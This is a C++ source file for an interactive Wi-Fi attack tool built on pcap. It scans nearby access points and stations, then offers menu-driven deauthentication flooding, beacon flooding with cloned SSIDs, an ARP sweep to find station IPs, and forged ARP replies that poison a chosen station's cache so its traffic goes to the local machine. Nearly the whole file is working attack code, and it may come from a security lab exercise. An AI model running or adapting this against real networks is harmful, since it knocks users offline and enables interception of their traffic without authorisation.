#include <pcap.h>
#include <stdlib.h>
#include "dot11.h"
#include "radiotap.h"
#include "ethernet.h"
#include <set>
#include <string.h>
#include <vector>
#include <map>
#include <unistd.h>
#include <thread>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if.h>
#include <iostream>


map<uint16_t,uint8_t> rd_channel={{2412,1},{2417,2},{2422,3},{2427,4},{2432,5},{2437,6},{2442,7},{2447,8},
                                   {2452,9},{2457,10},{2462,11},{2467,12},{2472,13},{5180,36},{5200,40},
                                    {5220,44},{5240,48},{5260,52},{5280,56},{5300,60},{5320,64},{5500,100},
                                   {5520,104},{5540,108},{5560,112},{5580,116},{5600,120},{5620,124},
                                  {5640,128},{5660,132},{5680,136},{5700,140},{5745,149},{5765,153},
                                  {5785,157},{5805,161},{5825,165}};


void usage(){

    printf("syntax: airodump <interface>\n");
    printf("sample: airodump wlan0\n");
}

void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls);
void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls);
void select(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls,vector<uint8_t> &sel_mac,struct ap &sel_ap);
void scan_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp);
void print_station(map<vector<uint8_t>,vector<uint8_t>> arp);
void select_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip);

void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac);
void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);
void exe_arp(pcap_t* handle,vector<uint8_t> &sel_mac);

void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel);
void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size);

void get_local_ip(u_char *l);
void get_local_mac(struct ifreq *v);

void find_ip(vector<uint8_t> &sel_mac,vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip);
void set_ip(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_ip);
void send_rarp(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip);

int main(int argc, char *argv[])
{

    //using namespace std;
    if(argc!=2){
        usage();
        return -1;
    }

   /* interface open */

    char* dev =argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return -1;
    }

    /* get packet */


    set<vector<uint8_t>> ap_list ;
    map<vector<uint8_t>,struct ap> ap_ls;
    vector<uint8_t> sel_mac;
    struct ap sel_ap;


    select(handle,ap_list,ap_ls,sel_mac,sel_ap);

    while(true){

    printf("                               ");
    printf("------------------Select------------------\n");
    printf("                                            ");
    for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
    printf("%02x\n",sel_mac[5]);
    printf("                                         ");
    printf("ESSID:");
    for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
    printf("\n");



    int menu_nr;
    printf("                               ");
    printf("-------------------Menu-------------------\n");
    printf("                               ");
    printf("    [1] Rescan \n");
    printf("                               ");
    printf("    [2] Deauth Attack & Checking \n");
    printf("                               ");
    printf("    [3] Beacon Flooding \n");
    printf("                               ");
    printf("    [4] ARP Spoofing \n");
    printf("                               ");
    printf("    [5] Exit \n");
    printf("                               ");
    printf("------------------------------------------\n");
    printf("select Menu Number : ");
    scanf("%d",&menu_nr);


    if(menu_nr==1)select(handle,ap_list,ap_ls,sel_mac,sel_ap);
    else if(menu_nr==2)exe_deauth(handle,sel_mac);
    else if (menu_nr==3)exe_beacon(handle,sel_mac,sel_ap);
    else if(menu_nr==4)exe_arp(handle,sel_mac);
    else break;
  }


}



void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls){



    int cnt=0;
    while(true){
        if(cnt==50) break;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);
        if(dot11->fc.type != 0 || dot11->fc.subtype!=0x08) continue;

        uint8_t *target = dot11->bssid;



       vector<uint8_t> temp;
       vector<uint8_t> name;
       for(int i=0;i<6;i++)
           temp.push_back(*(target+i));
       cnt++;
       if(!ap_list.insert(temp).second) {ap_ls.find(temp)->second.beacon++; continue;}


       struct ssid *size_ptr= (struct ssid *)(packet+rd->len+sizeof(struct dot11_header)+sizeof(struct beacon_fixed));

       uint8_t size = size_ptr->ssid_len;

       for(int i=0;i<size;i++){

                name.push_back(*((uint8_t *)(packet+rd->len+sizeof(dot11_header)+sizeof(struct beacon_fixed)+2+i)));
       }
       struct ap temp_ap;
       temp_ap.beacon=1;
       temp_ap.essid=name;
       temp_ap.channel=(rd_channel.find(*((uint16_t*)rd+9)))->second;
       temp_ap.pwr=-((~(*((uint8_t*)rd+22))+1)&0x000000FF);
       temp_ap.essid_len=size;
       //printf("%d\n",temp_ap.pwr);
       ap_ls.insert({temp,temp_ap});


    }
}

void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls){


    printf("      BSSID            PWR    Beacons  #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  \n");

    int num=1;
    for(auto i=ap_ls.begin();i!=ap_ls.end();i++)
           {
             if(num>9)printf("[%d]",num++);
             else printf("[%d] ",num++);

             for(int j=0;j<5;j++)
                 printf("%02x:",i->first[j]);
             printf("%02x",i->first[5]);
             printf("  %3d",i->second.pwr);
             printf("    %7d",i->second.beacon);
             printf("             %3d",i->second.channel);
             printf("                         ");
             for(auto k=i->second.essid.begin();k<i->second.essid.end();k++)
                  printf("%c",(*k));
             printf("\n");

           }
        printf("total AP : %ld\n",ap_list.size());

}

void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel){

    uint8_t pk_cnt=0;
    sleep(5);
    printf("scan start\n");
    while(*run){
        printf("scanning\n");
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);

        uint8_t *target = dot11->dest;
       bool is_continue=false;
       for(int i=0;i<6;i++){
           if(target[i]!=sel[i]) {is_continue=true;break;}}
        if(is_continue)continue;
        if((dot11->fc.type!=1) || (dot11->fc.subtype!=11)) continue;

        /*
        printf("find!!\n");

        for(int i=0;i<6;i++)
            printf("%02x",*(target+i));
        printf("\n");

        int pk_size=rd->len + sizeof(dot11->fc)+sizeof(dot11->dest)+sizeof(dot11->duration)+sizeof(dot11->sour);
        for(int i=0;i<pk_size;i++)
            printf("%02x",*(packet+i));
        printf("\n");
        */

        if(++pk_cnt>5){*attack=true;break;}
    }
}

void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size){

    for(int i=0;i<1000000;i++){
             if(i%100==0) {
                 if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");
                 printf("send packet %d\n", i);
                 usleep(5000);
             }
       }
}

void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac){





    bool attack_defense=false;
    bool scan_run=true;
    uint8_t deauth_size=0;
    uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);


    time_t start,end;
    start=time(NULL);
    thread attack = thread(thread_attack,handle,deauth,deauth_size);
    thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);

    attack.join();
    if((!attack.joinable())&&(scan.joinable())) scan_run=false;
    scan.join();
    end=time(NULL);

    system("clear");
    printf("                               ");
    printf("------------------Result------------------\n");
    printf("                                            ");
    printf("Total time : %f\n",(double)end-start);
    printf("                                            ");
    printf("Deauth defense : %d\n",attack_defense);
    printf("                               ");
    printf("------------------------------------------\n");
}
void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
    uint8_t beacon1_size;
    uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
    uint8_t *beacon2=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,2);
    uint8_t *beacon3=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,3);



    for(int i=0;i<1000000;i++){
     if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
     if(i%100000==0) printf("~Beacon Flooding~\n");
     usleep(5000);
    }
}

void select(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls,vector<uint8_t> &sel_mac,struct ap &sel_ap){

    int sel;
    while(true){
        ap_list.clear();
        ap_ls.clear();
        scan(handle,ap_list, ap_ls);


        /* Print AP list*/

        print_ap(ap_list,ap_ls);


        /* Select AP */


        printf("select AP Number (research:0) : ");
        scanf("%d",&sel);

        if(sel==0) continue;
        else break;
    }


    int number=1;
    for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
        if(sel!=number++) continue;

        sel_mac=i->first;
        sel_ap=i->second;


       }
}

void scan_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp){

    int cnt=0;
    while(true){
        if(cnt==5) break;
        printf("scanning\n");
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);

        uint8_t *dest_target = dot11->dest;
        //uint8_t *sour_target = dot11->sour;
        bool is_continue1=false;
        //bool is_continue2=false;
        for(int i=0;i<6;i++){
           if(dest_target[i]!=sel_mac[i]) {is_continue1=true;break;}}

        /*
        for(int i=0;i<6;i++){
           if(sour_target[i]!=sel_mac[i]) {is_continue2=true;break;}}*/
        if(is_continue1)continue;

        /* destinataion addr == select AP MAC*/



        if(dot11->fc.type==0) continue;



        if((dot11->fc.type==1)&&(dot11->fc.subtype!=8)) continue;
        if((dot11->fc.type==1)&&(dot11->fc.subtype!=10)) continue;
        if((dot11->fc.type==1)&&(dot11->fc.subtype!=11)) continue;


        cnt++;




        /* only control(only rts,bar,ps poll) */

        vector<uint8_t> temp_mac;
        vector<uint8_t> temp_ip;




        for(int i=0;i<4;i++) temp_ip.push_back(0x11);

        for(int i=0;i<6;i++) temp_mac.push_back(dot11->sour[i]);


        arp.insert({temp_mac,temp_ip});


    }




}

void print_station(map<vector<uint8_t>,vector<uint8_t>> arp){


    printf("      BSSID                       IP\n");

    int num=1;
    for(auto i=arp.begin();i!=arp.end();i++)
           {
             if(num>9)printf("[%d]",num++);
             else printf("[%d] ",num++);

             for(int j=0;j<5;j++)
                 printf("%02x:",i->first[j]);
             printf("%02x",i->first[5]);
             printf("          ");
             for(int j=0;j<3;j++)
                 printf("%02x.",i->second[j]);
             printf("%02x",i->second[3]);

             printf("\n");

           }
        printf("total station : %ld\n",arp.size());

}

void select_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip){

    int sel;
    while(true){
        //arp.clear();
        scan_station(handle,sel_mac,arp);
        system("clear");



        /* Print station list*/
        print_station(arp);


        /* Select station */


        printf("select station Number (research:0) : ");
        scanf("%d",&sel);

        if(sel==0) continue;
        else break;
    }


    int number=1;
    for(auto i=arp.begin();i!=arp.end();i++){
        if(sel!=number++) continue;

        sel_st_mac=i->first;
        sel_st_ip=i->second;


       }
}

void exe_arp(pcap_t* handle,vector<uint8_t> &sel_mac){

    map<vector<uint8_t>,vector<uint8_t>> arp;
    vector<uint8_t> sel_st_mac;
    vector<uint8_t> sel_st_ip;
    vector<uint8_t> sel_ip; //ap's ip
    for(int i=0;i<4;i++) sel_ip.push_back(0x11);

    select_station(handle,sel_mac,arp,sel_st_mac,sel_st_ip);
    while(true){

        printf("                               ");
        printf("--------------------AP---------------------\n");
        printf("                                            ");
        for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
        printf("%02x\n",sel_mac[5]);
        printf("                                               ");
        for(int j=0;j<3;j++) printf("%d.",sel_ip[j]);
        printf("%d\n",sel_ip[3]);


        printf("                               ");
        printf("------------------Station------------------\n");
        printf("                                            ");
        for(int j=0;j<5;j++) printf("%02x:",sel_st_mac[j]);
        printf("%02x\n",sel_st_mac[5]);
        printf("                                               ");
        for(int j=0;j<3;j++) printf("%d.",sel_st_ip[j]);
        printf("%d\n",sel_st_ip[3]);
        int menu_nr;
        printf("                               ");
        printf("-------------------Menu-------------------\n");
        printf("                               ");
        printf("    [1] Rescan \n");
        printf("                               ");
        printf("    [2] ARP Pollution \n");
        printf("                               ");
        printf("    [3] Find IP \n");
        printf("                               ");
        printf("    [4] Set IP \n");
        printf("                               ");
        printf("    [5] Exit \n");
        printf("                               ");
        printf("------------------------------------------\n");
        printf("select Menu Number : ");
        scanf("%d",&menu_nr);

        if(menu_nr==1)select_station(handle,sel_mac,arp,sel_st_mac,sel_st_ip);
        else if(menu_nr==2)send_rarp(sel_ip,sel_st_mac,sel_st_ip);
        else if(menu_nr==3) find_ip(sel_mac,sel_ip,sel_st_mac,sel_st_ip);
        else if(menu_nr==4) set_ip(sel_ip,sel_st_ip);
        else break;

    }


}

void set_ip(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_ip){
    string ap_ip;
    printf("AP IP : ");
    cin.ignore();
    getline(cin,ap_ip,'\n');

    string st_ip;




    size_t previous = 0,current;
    current = ap_ip.find('.');
    int i=0;

    while (true)
    {

        string substring = ap_ip.substr(previous, current - previous);

        sel_ip[i++]=stoi(substring);
        if(current == string::npos) {break;}//cout << substring;
        //cout << substring << ".";
        previous = current + 1;

        current = ap_ip.find('.',previous);
    }


    printf("Station IP : ");
    getline(cin,st_ip,'\n');
    previous = 0;
    current = st_ip.find('.');
    i=0;
    printf("\n");

    while (true)
    {

        string substring = st_ip.substr(previous, current - previous);


        sel_st_ip[i++]=stoi(substring);

        if(current == string::npos) {break;}//cout << substring;
        //cout << substring << ".";
        previous = current + 1;

        current = st_ip.find('.',previous);
    }
    cout<<"\n";


}

void find_ip(vector<uint8_t> &sel_mac,vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip){

    char dev[5] ={'e','t','h','0','\0'};
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return;
    }

    /*get local mac*/
    struct ifreq s;
    get_local_mac(&s);


    /*get local ip*/

    u_char local[4];
    get_local_ip(local);

    /*set ARP packet*/

    struct libnet_ethernet_hdr ehdr;
    struct arp_hdr ahdr;

    for(int i=0;i<6;i++) ehdr.ether_dhost[i]=0xff;
    for(int i=0;i<6;i++) ehdr.ether_shost[i]=s.ifr_addr.sa_data[i];//local mac

    ehdr.ether_type=htons(ARP);
    ahdr.htype=htons(ETH);
    ahdr.ptype=htons(IPv4);
    ahdr.hlen=HLEN;
    ahdr.plen=PLEN;
    ahdr.opcode=htons(REQ);

    for(int i=0;i<6;i++){
        ahdr.h_src[i]=s.ifr_addr.sa_data[i];
        printf("%02x ",ahdr.h_src[i]);
            }//local mac

    for(int i=0;i<4;i++){
        ahdr.ip_src[i]=local[i];
        printf("%d. ",ahdr.ip_src[i]);
          }//local ip
    for(int i=0;i<6;i++){
        ahdr.h_dst[i]=sel_st_mac[i];
        printf("%02x ",ahdr.h_dst[i]);
                }//mac=>zero

    int ip=1;
    bool find_station_ip=false;
    bool find_ap_ip=false;
    while(ip<255){
        printf("\ndestination IP : ");
    for(int i=0;i<3;i++){
        ahdr.ip_dst[i]=local[i];
        printf("%d. ",ahdr.ip_dst[i]);}
        ahdr.ip_dst[3]=ip++;printf("%d",ahdr.ip_dst[3]);
        printf("\n");

        /*send ARP REQ*/

        uint8_t packet_size = sizeof(struct libnet_ethernet_hdr)+sizeof(struct arp_hdr);

        uint8_t *packet;


        packet = (uint8_t *)malloc(sizeof(uint8_t) * packet_size);
        memcpy(packet, &ehdr, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet + sizeof(struct libnet_ethernet_hdr), &ahdr, sizeof(struct arp_hdr));


        for(int i=0;i<5;i++)
        {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");usleep(5000);}

        printf("\nSend ARP REQ Packet\n");

        struct libnet_ethernet_hdr *newhdr;
        struct arp_hdr* arp_reply;

        time_t start,end;
        start=time(NULL);

        while(true) {
            end=time(NULL);
            if(end-start>0) {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");}
            if(end-start>1) {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");}
            if(end-start>2) {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");}


            struct pcap_pkthdr* header;
            const u_char* pack;
            int res = pcap_next_ex(handle, &header, &pack);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;


            newhdr = (struct libnet_ethernet_hdr *)pack;
            if(end-start>5) {printf("skip\n");break;}


            if(ntohs(newhdr->ether_type)!=ARP) continue;
            arp_reply = (struct arp_hdr *)(pack + sizeof(struct libnet_ethernet_hdr));

            if(ntohs(arp_reply->opcode)!=REP) continue;




            int cnt=0;
            for(int i=0;i<4;i++){if(ahdr.ip_dst[i]==arp_reply->ip_src[i])cnt++;}
            if(cnt==4) {printf("\nReceive ARP REP Packet\n");break;}
            }
        for(int i=0;i<6;i++)printf("%02x.",arp_reply->h_src[i]);
        printf("\n");

      int cnt1=0;
      int cnt2=0;

      for(int i=0;i<6;i++){if(ahdr.h_dst[i]==arp_reply->h_src[i])cnt1++;}
      for(int i=0;i<6;i++){if(sel_mac[i]==arp_reply->h_src[i])cnt2++;}
      printf("\n");
      if(cnt1==6) {
          printf("find station IP\n");
          for(int i=0;i<4;i++){
            sel_st_ip[i]=arp_reply->ip_dst[i];
            printf("%d. ",sel_st_ip[i]);}
          find_station_ip=true;}
     printf("\n");

      if(cnt2==6) {
          printf("find AP IP\n");
          for(int i=0;i<4;i++){
            sel_ip[i]=arp_reply->ip_dst[i];
            printf("%d. ",sel_ip[i]);}
          find_ap_ip=true;}
      printf("\n");

      if(find_station_ip) break;
       }


    }



void send_rarp(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip){

    int cnt=0;
    for(int i=0;i<4;i++){if(sel_st_ip[i]==0x11)cnt++;}
    if(cnt==4) {printf("you should find IP first\n");return;}

    char dev[5] ={'e','t','h','0','\0'};
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return;
    }

    /*get local mac*/
    struct ifreq s;
    get_local_mac(&s);


    /*get local ip*/

    u_char local[4];
    get_local_ip(local);


    /*make reply packet*/


       struct libnet_ethernet_hdr r_ehdr;
       struct arp_hdr r_ahdr;


       for(int i=0;i<6;i++)
           r_ehdr.ether_shost[i]=s.ifr_addr.sa_data[i];
       for(int i=0;i<6;i++){
           r_ehdr.ether_dhost[i]=0xff;
       }//local mac
       r_ehdr.ether_type=htons(ARP);

       r_ahdr.htype=htons(ETH);
       r_ahdr.ptype=htons(IPv4);
       r_ahdr.hlen=HLEN;
       r_ahdr.plen=PLEN;
       r_ahdr.opcode=htons(REP);

       printf("\nARP - SOURCE MAC ");
       for(int i=0;i<6;i++){
           r_ahdr.h_src[i]=s.ifr_addr.sa_data[i];
           printf("%02x ",r_ahdr.h_src[i]);
               }//Local mac

       printf("\nARP - SOURCE IP ");
       for(int i=0;i<4;i++){
           r_ahdr.ip_src[i]=sel_ip[i];
           printf("%d. ",r_ahdr.ip_src[i]);
             }//AP ip

       printf("\nARP - DST MAC ");
       for(int i=0;i<6;i++){
           r_ahdr.h_dst[i]=sel_st_mac[i];
           printf("%02x ",r_ahdr.h_dst[i]);
                   }//station mac

       printf("\nARP - DST IP ");
       for(int i=0;i<4;i++){
           r_ahdr.ip_dst[i]=sel_st_ip[i];
           printf("%d. ",r_ahdr.ip_dst[i]);
                   }//station IP */

       /*send reply packet*/


        //printf("\nSend ARP Reply Packet\n");

        u_char* packet2;
        int packet_size = sizeof(struct libnet_ethernet_hdr)+sizeof(struct arp_hdr);

        packet2 = (u_char *)malloc(sizeof(u_char) * packet_size);
        memcpy(packet2, &r_ehdr, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet2 + sizeof(struct libnet_ethernet_hdr), &r_ahdr, sizeof(struct arp_hdr));



        for(int i=0;i<5;i++)
        {if (pcap_sendpacket(handle, packet2, packet_size) != 0) printf("\nsend packet Error \n");usleep(5000);}
        printf("\n>>Send ARP Reply<<\n");






}

void get_local_mac(struct ifreq *v){
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(v->ifr_name, "eth0");

    if (0 != ioctl(fd, SIOCGIFHWADDR, v)) {
        printf("get local mac error \n");
        return ;
    }
    close(fd);//v->ifr_addr.sa_data

    printf("MY MAC : ");
    for(int i=0;i<6;i++)
        printf("%02x ",(unsigned char)v->ifr_addr.sa_data[i]);
    printf("\n");
}

void get_local_ip(u_char *l){
    struct ifreq ifr;

    int fc = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ -1);

    ioctl(fc, SIOCGIFADDR, &ifr);
    close(fc);


    //((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr
    printf("MY IP : %s\n",inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    char* local_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

    sscanf(local_ip, "%hhd.%hhd.%hhd.%hhd", l,l+1,l+2,l+3);

}
